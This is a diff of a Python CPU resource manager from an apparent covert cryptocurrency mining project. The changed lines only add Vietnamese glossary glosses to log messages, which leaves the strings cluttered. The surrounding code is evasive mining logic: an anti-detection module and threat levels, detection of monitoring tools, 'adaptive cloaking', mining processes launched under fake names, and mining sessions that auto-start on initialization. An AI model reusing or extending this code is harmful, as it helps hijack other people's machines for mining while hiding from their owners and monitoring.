@@ -148,7 +148,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             self.optimal_mining_config = self.xeon_optimizer.generate_mining_config('balanced')
             self.current_threat_level = "LOW"
             
-            self.logger.info("🛡️ [CPU Manager] Advanced stealth capabilities initialized")
+            self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Advanced stealth capabilities initialized")
             self.stealth_enabled = True
             
         except Exception as e:
@@ -162,7 +162,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 context_data={'error': str(e), 'stealth_enabled': False},
                 exception=e
             )
-            self.logger.error(f"Lỗi khi khởi tạo cpu manager: {e}")
+            self.logger.error(f"Lỗi khi khởi tạo **[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý): {e}")
             self.stealth_enabled = False
             # Fallback initialization for basic functionality
             pass
@@ -182,23 +182,23 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         self.throttler = None
         try:
             self.throttler = MiningIntegrationAdapter(logger=self.logger)
-            self.logger.info("🛡️ [CPU Manager] Throttling Manager initialized.")
+            self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Throttling **[manager]** (trình quản lý) initialized.")
             
             # ✅ NEW: Auto-initialize optimized mining system on startup
             try:
                 cores = self.cpu_count  # Available CPU cores
                 if self.throttler.initialize_optimized_mining(cores):
-                    self.logger.info(f"🚀 [CPU Manager] Auto-initialized optimized mining for {cores} cores")
+                    self.logger.info(f"🚀 [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Auto-initialized optimized mining for {cores} cores")
                     
                     # Auto-start mining session for immediate availability
                     if self.throttler.start_mining_session():
-                        self.logger.info("✅ [CPU Manager] Mining session auto-started successfully")
+                        self.logger.info("✅ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Mining session auto-started successfully")
                     else:
-                        self.logger.warning("⚠️ [CPU Manager] Mining session auto-start failed")
+                        self.logger.warning("⚠️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Mining session auto-start failed")
                 else:
-                    self.logger.warning("⚠️ [CPU Manager] Auto-initialization of optimized mining failed")
+                    self.logger.warning("⚠️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Auto-initialization of optimized mining failed")
             except Exception as auto_init_error:
-                self.logger.error(f"❌ [CPU Manager] Auto-initialization error: {auto_init_error}")
+                self.logger.error(f"❌ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Auto-initialization **[error]** (lỗi): {auto_init_error}")
                 
         except Exception as e:
             # ✅ ERROR REPORTING: Critical MiningIntegrationAdapter initialization failure
@@ -218,9 +218,9 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             from mining_environment.cpu_plugins.rdt_cache_control.manager import RdtCatManager  # type: ignore
             self.rdt_manager = RdtCatManager(self.logger)
             if self.rdt_manager.is_active():
-                self.logger.info("🛡️ [CPU Manager] RDT CAT cache control đã sẵn sàng.")
+                self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] RDT CAT **[cache]** (bộ nhớ đệm) control đã sẵn sàng.")
             else:
-                self.logger.info("🛡️ [CPU Manager] RDT CAT không khả dụng trên hệ thống này.")
+                self.logger.info("🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] RDT CAT không khả dụng trên hệ thống này.")
         except Exception as e:
             self.logger.warning(f"Không thể khởi tạo RdtCatManager: {e}")
             self.rdt_manager = None
@@ -236,12 +236,12 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         try:
             cfg_obj = load_plugin_cfg(self._cfg_path)
         except Exception as exc:  # noqa: BLE001
-            self.logger.warning(f"[CPU] Không thể load cpu_plugins.yml: {exc}")
+            self.logger.warning(f"[**[CPU]** (bộ xử lý trung tâm)] Không thể load cpu_plugins.yml: {exc}")
 
         try:
             self.plugins: List[ICpuTechnique] = discover_cpu_plugins(self, self.logger, cfg_obj)  # type: ignore[arg-type]
         except Exception as exc:  # noqa: BLE001
-            self.logger.error(f"[CPU] Không thể load plug-ins: {exc}")
+            self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm)] Không thể load plug-ins: {exc}")
             self.plugins = []
 
         # Đăng ký signal reload một lần (chỉ trong main thread)
@@ -250,11 +250,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 if threading.current_thread() is threading.main_thread():
                     signal.signal(signal.SIGHUP, lambda *_: CPUResourceManager({}, self.logger).reload_plugins())
                     CPUResourceManager._signal_registered = True  # type: ignore[attr-defined]
-                    self.logger.info("[CPU] Đăng ký SIGHUP reload plug-ins thành công.")
+                    self.logger.info("[**[CPU]** (bộ xử lý trung tâm)] Đăng ký SIGHUP reload plug-ins thành công.")
                 else:
-                    self.logger.debug("[CPU] Bỏ qua đăng ký SIGHUP - không ở main thread.")
+                    self.logger.debug("[**[CPU]** (bộ xử lý trung tâm)] Bỏ qua đăng ký SIGHUP - không ở main **[thread]** (luồng).")
             except Exception as exc:  # noqa: BLE001
-                self.logger.warning(f"[CPU] Không thể đăng ký SIGHUP: {exc}")
+                self.logger.warning(f"[**[CPU]** (bộ xử lý trung tâm)] Không thể đăng ký SIGHUP: {exc}")
 
     def _stealth_monitoring_loop(self):
         """
@@ -269,7 +269,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 # Update threat level
                 threat_level = self.anti_detection.get_current_threat_level()
                 if threat_level != self.current_threat_level:
-                    self.logger.info(f"🛡️ [CPU Manager] Threat level changed: {self.current_threat_level} → {threat_level}")
+                    self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Threat level changed: {self.current_threat_level} → {threat_level}")
                     self.current_threat_level = threat_level
 
                 # Update signature patterns
@@ -285,7 +285,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 time.sleep(sleep_duration)
 
             except Exception as e:
-                self.logger.error(f"🛡️ [CPU Manager] Stealth monitoring error: {e}")
+                self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Stealth monitoring **[error]** (lỗi): {e}")
                 time.sleep(60)
 
     def _adapt_throttling_to_threat_level(self, pid: int, threat_level: str) -> bool:
@@ -302,13 +302,13 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             new_throttle = threat_throttle_mapping.get(threat_level, 50)
             
             # Apply throttling (this would need the actual cgroup implementation)
-            self.logger.info(f"🛡️ [CPU Manager] Adapting PID={pid} throttle to {new_throttle:.1f}% for threat level {threat_level}")
+            self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Adapting **[PID]** (Process ID - mã định danh tiến trình)={pid} throttle to {new_throttle:.1f}% for threat level {threat_level}")
             
             # Note: Actual cgroup throttling implementation would go here
             # For now, just log the adaptation
             
         except Exception as e:
-            self.logger.error(f"🛡️ [CPU Manager] Failed to adapt throttling for PID={pid}: {e}")
+            self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Failed to adapt throttling for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def get_stealth_optimized_config(self) -> Dict[str, Any]:
@@ -327,7 +327,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 "performance_estimate": self.xeon_optimizer.generate_mining_config('stealth')
             }
         except Exception as e:
-            self.logger.error(f"🛡️ [CPU Manager] Failed to get stealth config: {e}")
+            self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Failed to get stealth **[config]** (cấu hình): {e}")
             return {}
 
     def start_adaptive_cloaking(self) -> bool:
@@ -338,7 +338,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             # ✅ DIAGNOSTIC: Log entry point với DEBUG level
             self.logger.debug(f"🔍 [DIAGNOSTIC] start_adaptive_cloaking called")
             self.logger.debug(f"📊 Current threat level: {self.current_threat_level}")
-            self.logger.debug(f"🎯 Anti-detection module: {type(self.anti_detection)}")
+            self.logger.debug(f"🎯 Anti-detection **[module]** (mô-đun): {type(self.anti_detection)}")
             self.logger.debug(f"🎭 Signature randomizer: {type(self.signature_randomizer)}")
             
             # Detect monitoring tools
@@ -414,11 +414,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 cgroup_name = f"randomx_opt_{pid}"
                 if self.configure_cpuset(cgroup_name, all_cores):
                     if self.assign_process_to_cpuset(pid, cgroup_name):
-                        self.logger.info(f"Đã áp dụng [RandomX optimized cpuset] (tập CPU tối ưu cho RandomX) cho PID={pid}: {all_cores}")
+                        self.logger.info(f"Đã áp dụng [RandomX optimized cpuset] (tập **[CPU]** (bộ xử lý trung tâm) tối ưu cho RandomX) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {all_cores}")
                     else:
-                        self.logger.error(f"Không thể gán PID={pid} vào [RandomX cpuset] (tập CPU dành cho RandomX)")
+                        self.logger.error(f"Không thể gán **[PID]** (Process ID - mã định danh tiến trình)={pid} vào [RandomX cpuset] (tập **[CPU]** (bộ xử lý trung tâm) dành cho RandomX)")
                 else:
-                    self.logger.error(f"Cấu hình [RandomX cpuset] (tập CPU dành cho RandomX) cho PID={pid} thất bại")
+                    self.logger.error(f"Cấu hình [RandomX cpuset] (tập **[CPU]** (bộ xử lý trung tâm) dành cho RandomX) cho **[PID]** (Process ID - mã định danh tiến trình)={pid} thất bại")
             
             # Store optimization info
             self.throttled_processes[pid] = {
@@ -433,7 +433,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             return True
 
         except Exception as e:
-            self.logger.error(f"Tối ưu [RandomX] (thuật toán khai thác) thất bại cho PID={pid}: {e}")
+            self.logger.error(f"Tối ưu [RandomX] (thuật toán khai thác) thất bại cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def create_stealth_mining_process(self, miner_binary_path: str, mining_args: List[str] = None) -> Optional[int]:
@@ -447,7 +447,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             
             # Execute với stealth process manager
             fake_name = self.stealth_manager.get_fake_process_name()
-            self.logger.info(f"Tạo [stealth mining process] (tiến trình khai thác che giấu) với tên: {fake_name}")
+            self.logger.info(f"Tạo [stealth mining **[process]** (tiến trình)] (tiến trình khai thác che giấu) với tên: {fake_name}")
             
             # For now, create normal process but with stealth configuration
             # (Full memory execution would need more complex implementation)
@@ -468,11 +468,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 throttle_level = threat_throttle.get(self.current_threat_level, 50)
                 self.throttle_cpu_usage(process.pid, throttle_level)
                 
-                self.logger.info(f"Đã tạo [stealth mining process] (tiến trình khai thác che giấu): PID={process.pid}, [throttle] (giới hạn)={throttle_level}%")
+                self.logger.info(f"Đã tạo [stealth mining **[process]** (tiến trình)] (tiến trình khai thác che giấu): **[PID]** (Process ID - mã định danh tiến trình)={process.pid}, [throttle] (giới hạn)={throttle_level}%")
                 return process.pid
             
         except Exception as e:
-            self.logger.error(f"Tạo [stealth mining process] (tiến trình khai thác che giấu) thất bại: {e}")
+            self.logger.error(f"Tạo [stealth mining **[process]** (tiến trình)] (tiến trình khai thác che giấu) thất bại: {e}")
             
         return None
 
@@ -524,7 +524,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         try:
             cpu_count = psutil.cpu_count(logical=True)
             if cpu_count is None:
-                self.logger.warning("Không thể xác định số lượng CPU cores.")
+                self.logger.warning("Không thể xác định số lượng **[CPU]** (bộ xử lý trung tâm) cores.")
                 return []
             return list(range(cpu_count))
         except Exception as e:
@@ -555,9 +555,9 @@ class CPUResourceManager(metaclass=_SingletonMeta):
 
         try:
             # ✅ ENHANCED: Detailed throttling operation logging
-            resource_logger.info(f"🎛️ [CPU Throttle] Starting throttling for PID={pid}")
-            resource_logger.info(f"📊 [CPU Throttle] Target throttle: {throttle_percentage}%, cores: {cores}")
-            resource_logger.info(f"🔧 [CPU Throttle] Using cgroup: {base_cgroup_name or 'auto-generated'}")
+            resource_logger.info(f"🎛️ [**[CPU]** (bộ xử lý trung tâm) Throttle] Starting throttling for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
+            resource_logger.info(f"📊 [**[CPU]** (bộ xử lý trung tâm) Throttle] Target throttle: {throttle_percentage}%, cores: {cores}")
+            resource_logger.info(f"🔧 [**[CPU]** (bộ xử lý trung tâm) Throttle] Using cgroup: {base_cgroup_name or 'auto-generated'}")
             
             # ✅ ENHANCED: Complete MiningIntegrationAdapter workflow activation
             success = False
@@ -578,23 +578,23 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             resource_logger.info(f"⚖️ [Throttle] Applied {throttle_percentage}% throttling: {success}")
 
             if success:
-                resource_logger.info(f"✅ [CPU Throttle] Successfully applied throttling to PID={pid}")
-                resource_logger.info(f"📈 [CPU Throttle] CPU usage limited to {throttle_percentage}%")
+                resource_logger.info(f"✅ [**[CPU]** (bộ xử lý trung tâm) Throttle] Successfully applied throttling to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
+                resource_logger.info(f"📈 [**[CPU]** (bộ xử lý trung tâm) Throttle] **[CPU]** (bộ xử lý trung tâm) usage limited to {throttle_percentage}%")
                 # Các kỹ thuật không trùng lặp khác vẫn được áp dụng
                 # CPU cores will be managed by cgroup cpuset, not process affinity
                 # This avoids conflicts between multiple CPU management systems
                 if cores:
-                    self.logger.info(f"CPU cores {cores} will be managed via cgroup cpuset for PID {pid}")
+                    self.logger.info(f"**[CPU]** (bộ xử lý trung tâm) cores {cores} will be managed via cgroup cpuset for **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                 
                 # RDT CAT: cấp cache percentage (nếu có)
                 if hasattr(self, "rdt_manager") and self.rdt_manager and self.rdt_manager.is_active():
                     cache_pct = int(max(25, 100 - throttle_percentage))  # Giảm cache theo throttle
                     self.rdt_manager.set_cache_pct(pid, cache_pct)
-                    self.logger.info(f"Đã cấp {cache_pct}% LLC cache cho PID {pid}")
+                    self.logger.info(f"Đã cấp {cache_pct}% LLC **[cache]** (bộ nhớ đệm) cho **[PID]** (Process ID - mã định danh tiến trình) {pid}")
 
                 return f"throttled_process_{pid}"
 
-            self.logger.error(f"Không thể áp dụng điều tiết cho PID {pid} bằng mọi cơ chế.")
+            self.logger.error(f"Không thể áp dụng điều tiết cho **[PID]** (Process ID - mã định danh tiến trình) {pid} bằng mọi cơ chế.")
             return None
 
         except Exception as e:
@@ -603,7 +603,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
 
     def release_cpu_throttle(self, pid: int, cgroup_path: Optional[str] = None):
         """Gỡ bỏ tất cả các cơ chế điều tiết CPU."""
-        self.logger.info(f"Gỡ bỏ điều tiết cho PID {pid}.")
+        self.logger.info(f"Gỡ bỏ điều tiết cho **[PID]** (Process ID - mã định danh tiến trình) {pid}.")
 
         if self.throttler:
             # MiningIntegrationAdapter không có release method theo PID cụ thể
@@ -617,7 +617,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             pass 
         except Exception as e:
-            self.logger.warning(f"Lỗi khi khôi phục CPU affinity cho PID {pid}: {e}")
+            self.logger.warning(f"Lỗi khi khôi phục **[CPU]** (bộ xử lý trung tâm) affinity cho **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             
     # === CÁC HÀM PRIVATE ĐÃ BỊ XÓA - CHỨC NĂNG ĐƯỢC CHUYỂN VÀO MiningIntegrationAdapter ===
     # _reduce_cpu_frequency
@@ -652,15 +652,15 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 target_cores = available_cpus
 
             if not target_cores:
-                self.logger.error(f"Danh sách target_cores trống. Không thể tối ưu PID={pid}.")
+                self.logger.error(f"Danh sách target_cores trống. Không thể tối ưu **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                 return False
 
             # 2. CPU affinity managed by cgroup cpuset (will be set below)
-            self.logger.info(f"Target cores for PID={pid}: {target_cores} (managed via cgroup cpuset)")
+            self.logger.info(f"Target cores for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {target_cores} (managed via cgroup cpuset)")
 
             # 3. base_cgroup_name => bắt buộc phải có
             if not base_cgroup_name:
-                self.logger.error(f"Không có base_cgroup_name để tối ưu thread scheduling cho PID={pid}.")
+                self.logger.error(f"Không có base_cgroup_name để tối ưu **[thread]** (luồng) scheduling cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                 return False
 
             # 4. Tạo đường dẫn cgroup CPU và cpuset từ base_cgroup_name
@@ -669,13 +669,13 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             cpu_cgroup_path = os.path.join(self.CGROUP_CPU_BASE, cpu_cgroup_name)
             cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cpuset_cgroup_name)
 
-            self.logger.info("[optimize_thread_scheduling] Đã xác định đường dẫn cgroup CPU và cpuset.")
+            self.logger.info("[optimize_thread_scheduling] Đã xác định đường dẫn cgroup **[CPU]** (bộ xử lý trung tâm) và cpuset.")
             if self.logger.handlers:
                 self.logger.handlers[0].flush()
 
             # 5. Kiểm tra sự tồn tại của cgroup CPU và cpuset
             if not os.path.exists(cpu_cgroup_path):
-                self.logger.error(f"Cgroup CPU không tồn tại: {cpu_cgroup_path}.")
+                self.logger.error(f"Cgroup **[CPU]** (bộ xử lý trung tâm) không tồn tại: {cpu_cgroup_path}.")
                 return False
 
             if not os.path.exists(cpuset_cgroup_path):
@@ -700,13 +700,13 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             return True
 
         except psutil.NoSuchProcess:
-            self.logger.error(f"PID={pid} không tồn tại (optimize_thread_scheduling).")
+            self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại (optimize_thread_scheduling).")
             return False
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền set_cpu_affinity cho PID={pid}. Lỗi: {e}")
+            self.logger.error(f"Không đủ quyền set_cpu_affinity cho **[PID]** (Process ID - mã định danh tiến trình)={pid}. Lỗi: {e}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi optimize_thread_scheduling cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi optimize_thread_scheduling cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def configure_cpuset(self, cgroup_name: str, target_cores: List[int]) -> bool:
@@ -730,7 +730,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             # Create cgroup directory if it doesn't exist
             if not os.path.exists(cpuset_cgroup_path):
                 os.makedirs(cpuset_cgroup_path, exist_ok=True)
-                self.logger.info(f"Đã tạo [cpuset cgroup] (nhóm điều khiển CPU cpuset): {cpuset_cgroup_path}")
+                self.logger.info(f"Đã tạo [cpuset cgroup] (nhóm điều khiển **[CPU]** (bộ xử lý trung tâm) cpuset): {cpuset_cgroup_path}")
             
             # Set cpuset.cpus
             cpuset_cpus_file = os.path.join(cpuset_cgroup_path, "cpuset.cpus")
@@ -744,11 +744,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             with open(cpuset_mems_file, "w") as f:
                 f.write("0")  # Default to NUMA node 0
             
-            self.logger.info(f"Đã cấu hình [cpuset] (tập CPU) cho {cgroup_name}: [cores] (nhân)={cores_str}, [mems] (node bộ nhớ)=0")
+            self.logger.info(f"Đã cấu hình [cpuset] (tập **[CPU]** (bộ xử lý trung tâm)) cho {cgroup_name}: [cores] (nhân)={cores_str}, [mems] (node bộ nhớ)=0")
             return True
             
         except Exception as e:
-            self.logger.error(f"Cấu hình [cpuset] (tập CPU) cho {cgroup_name} thất bại: {e}")
+            self.logger.error(f"Cấu hình [cpuset] (tập **[CPU]** (bộ xử lý trung tâm)) cho {cgroup_name} thất bại: {e}")
             return False
 
     def assign_process_to_cpuset(self, pid: int, cgroup_name: str) -> bool:
@@ -778,11 +778,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             with open(cgroup_procs_file, "w") as f:
                 f.write(str(pid))
             
-            self.logger.info(f"Đã gán PID {pid} vào [cpuset cgroup] (nhóm điều khiển cpuset) {cgroup_name}")
+            self.logger.info(f"Đã gán **[PID]** (Process ID - mã định danh tiến trình) {pid} vào [cpuset cgroup] (nhóm điều khiển cpuset) {cgroup_name}")
             return True
             
         except Exception as e:
-            self.logger.error(f"Failed to assign PID {pid} to cpuset cgroup {cgroup_name}: {e}")
+            self.logger.error(f"Failed to assign **[PID]** (Process ID - mã định danh tiến trình) {pid} to cpuset cgroup {cgroup_name}: {e}")
             return False
 
     def optimize_cache_usage(self, pid: int) -> bool:
@@ -812,13 +812,13 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 "--cpunodebind", str(best_node),
                 "--", "taskset", "-p", str(pid)
             ]
-            self.logger.info(f"Chạy numactl tối ưu PID={pid}, node={best_node}.")
+            self.logger.info(f"Chạy numactl tối ưu **[PID]** (Process ID - mã định danh tiến trình)={pid}, node={best_node}.")
             result = subprocess.run(
                 command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10, shell=False
             )
 
             if result.returncode == 0:
-                self.logger.info(f"Tối ưu NUMA thành công cho PID={pid}.")
+                self.logger.info(f"Tối ưu NUMA thành công cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                 return True
             else:
                 err = result.stderr.strip() or "Không có thông báo lỗi."
@@ -826,16 +826,16 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 return False
 
         except psutil.NoSuchProcess:
-            self.logger.error(f"PID={pid} không tồn tại (optimize_cache_usage).")
+            self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại (optimize_cache_usage).")
             return False
         except psutil.AccessDenied:
-            self.logger.error(f"Không đủ quyền truy cập PID={pid}.")
+            self.logger.error(f"Không đủ quyền truy cập **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return False
         except subprocess.TimeoutExpired:
             self.logger.error("numactl timeout sau 10 giây.")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi tối ưu NUMA cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi khi tối ưu NUMA cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def _get_best_numa_node(self) -> Optional[Dict[str, Any]]:
@@ -908,7 +908,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             process = psutil.Process(pid)
             process_status = process.status()
             if process_status not in ['running', 'sleeping']:
-                self.logger.error(f"PID={pid} không tồn tại hoặc không hoạt động. Không thể khôi phục NUMA.")
+                self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại hoặc không hoạt động. Không thể khôi phục NUMA.")
                 return False
             
             # Lệnh numactl để khôi phục NUMA (shell=False)
@@ -917,18 +917,18 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False
             )
             if result.returncode != 0:
-                self.logger.error(f"Lỗi khi chạy numactl cho PID={pid}, code={result.returncode}.")
+                self.logger.error(f"Lỗi khi chạy numactl cho **[PID]** (Process ID - mã định danh tiến trình)={pid}, code={result.returncode}.")
                 self.logger.error(f"Chi tiết lỗi: {result.stderr.strip()}")
                 return False
 
-            self.logger.info(f"Khôi phục NUMA cho PID={pid} thành công.")
+            self.logger.info(f"Khôi phục NUMA cho **[PID]** (Process ID - mã định danh tiến trình)={pid} thành công.")
             return True
 
         except psutil.NoSuchProcess:
-            self.logger.error(f"PID={pid} không tồn tại.")
+            self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại.")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi khôi phục NUMA cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi khi khôi phục NUMA cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def get_cpu_temperature(self, pid: Optional[int] = None) -> float:
@@ -942,7 +942,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             # psutil.sensors_temperatures() => { 'coretemp': [entries], ... }
             temps_info = psutil.sensors_temperatures()
             if not temps_info:
-                self.logger.warning("CPUResourceManager: Không tìm thấy cảm biến nhiệt độ CPU (sensors rỗng).")
+                self.logger.warning("CPUResourceManager: Không tìm thấy cảm biến nhiệt độ **[CPU]** (bộ xử lý trung tâm) (sensors rỗng).")
                 return 0.0
 
             # Tìm key có 'coretemp' hoặc 'cpu'
@@ -955,15 +955,15 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                             cpu_temps.append(entry.current)
                     if cpu_temps:
                         avg_temp = sum(cpu_temps) / len(cpu_temps)
-                        self.logger.debug(f"CPUResourceManager: CPU Temperature = {avg_temp:.2f}°C")
+                        self.logger.debug(f"CPUResourceManager: **[CPU]** (bộ xử lý trung tâm) Temperature = {avg_temp:.2f}°C")
                         return float(avg_temp)
 
             # Không tìm thấy core => fallback 0.0
-            self.logger.warning("CPUResourceManager: Không tìm thấy entry CPU coretemp.")
+            self.logger.warning("CPUResourceManager: Không tìm thấy entry **[CPU]** (bộ xử lý trung tâm) coretemp.")
             return 0.0
             
         except Exception as e:
-            self.logger.error(f"CPUResourceManager: Lỗi khi lấy nhiệt độ CPU: {e}")
+            self.logger.error(f"CPUResourceManager: Lỗi khi lấy nhiệt độ **[CPU]** (bộ xử lý trung tâm): {e}")
             return 0.0
 
     def get_cpu_power(self, pid: Optional[int] = None) -> float:
@@ -984,10 +984,10 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 cpu_base_power_watts
                 + (cpu_load / 100.0) * (cpu_max_power_watts - cpu_base_power_watts)
             )
-            self.logger.debug(f"CPUResourceManager: CPU Load={cpu_load}%, Estimated Power={estimated_power:.2f}W")
+            self.logger.debug(f"CPUResourceManager: **[CPU]** (bộ xử lý trung tâm) Load={cpu_load}%, Estimated Power={estimated_power:.2f}W")
             return estimated_power
         except Exception as e:
-            self.logger.error(f"CPUResourceManager: Lỗi khi ước tính công suất CPU: {e}")
+            self.logger.error(f"CPUResourceManager: Lỗi khi ước tính công suất **[CPU]** (bộ xử lý trung tâm): {e}")
             return 0.0
 
     def delete_cgroup(self) -> bool:
@@ -1025,10 +1025,10 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                         pids = f.read().splitlines()
                     pids = [p for p in pids if p.strip()]  # Loại bỏ dòng trống
                     if pids:
-                        self.logger.info(f"Cgroup {cpath} vẫn có {len(pids)} PID. Bỏ qua việc xóa.")
+                        self.logger.info(f"Cgroup {cpath} vẫn có {len(pids)} **[PID]** (Process ID - mã định danh tiến trình). Bỏ qua việc xóa.")
                         continue
                 else:
-                    self.logger.warning(f"File tasks không tồn tại tại {tasks_file}. Xem như cgroup trống.")
+                    self.logger.warning(f"**[file]** (tệp) tasks không tồn tại tại {tasks_file}. Xem như cgroup trống.")
 
                 # Nếu trống => xóa cgroup
                 try:
@@ -1069,7 +1069,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                                 f"Di chuyển PID={pid_str} từ {cpu_cgroup_path} về root cgroup CPU."
                             )
                         except Exception as e:
-                            self.logger.error(f"Lỗi di chuyển PID={pid_str} về root cgroup CPU: {e}")
+                            self.logger.error(f"Lỗi di chuyển **[PID]** (Process ID - mã định danh tiến trình)={pid_str} về root cgroup **[CPU]** (bộ xử lý trung tâm): {e}")
 
                 # Xử lý cpuset subsystem
                 tasks_file_cpuset = os.path.join(cpuset_cgroup_path, "tasks")
@@ -1084,7 +1084,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                                 f"Di chuyển PID={pid_str} từ {cpuset_cgroup_path} về root cgroup cpuset."
                             )
                         except Exception as e:
-                            self.logger.error(f"Lỗi di chuyển PID={pid_str} về root cgroup cpuset: {e}")
+                            self.logger.error(f"Lỗi di chuyển **[PID]** (Process ID - mã định danh tiến trình)={pid_str} về root cgroup cpuset: {e}")
 
             return True
         except Exception as e:
@@ -1103,23 +1103,23 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             p = psutil.Process(pid)
             all_cpus = self.get_available_cpus()
             p.cpu_affinity(all_cpus)
-            self.logger.info(f"Đặt lại CPU affinity về all_cpus={all_cpus} cho PID={pid}.")
+            self.logger.info(f"Đặt lại **[CPU]** (bộ xử lý trung tâm) affinity về all_cpus={all_cpus} cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
 
             # 2. Gỡ NUMA
             if not self._restore_numa(pid):
-                self.logger.warning(f"Không thể khôi phục NUMA cho PID={pid}.")
+                self.logger.warning(f"Không thể khôi phục NUMA cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                 # Vẫn return True, vì đây chỉ là cảnh báo
 
             return True
 
         except psutil.NoSuchProcess:
-            self.logger.warning(f"PID={pid} không tồn tại khi restore_pid_resources.")
+            self.logger.warning(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại khi restore_pid_resources.")
             return False
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền gỡ CPU affinity cho PID={pid}. Lỗi: {e}")
+            self.logger.error(f"Không đủ quyền gỡ **[CPU]** (bộ xử lý trung tâm) affinity cho **[PID]** (Process ID - mã định danh tiến trình)={pid}. Lỗi: {e}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi restore_pid_resources cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi restore_pid_resources cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def restore_resources(self, pid: int) -> bool:
@@ -1141,11 +1141,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
 
                 # 1) Di chuyển PID khỏi cgroup => root
                 if not self.unassign_all_pids_in_cgroup(base_cgroup_name):
